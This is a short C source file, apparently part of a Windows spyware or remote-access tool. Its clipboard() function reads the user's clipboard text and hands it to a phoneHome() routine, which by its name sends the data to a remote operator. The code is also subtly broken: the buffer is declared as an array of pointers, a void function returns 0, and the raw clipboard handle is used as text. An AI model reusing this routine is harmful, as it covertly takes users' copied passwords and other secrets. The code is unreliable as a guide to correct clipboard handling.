#include "config.h"

void clipboard()
{
    HANDLE handle;
    char* szString[1000];

    OpenClipboard(NULL);
    handle = GetClipboardData(CF_TEXT);
    GlobalLock(handle);

    sprintf_s(szString, 1000, "%s\n", (char*)handle);

    GlobalUnlock(handle);
    CloseClipboard();
    phoneHome(szString);

    return 0;
}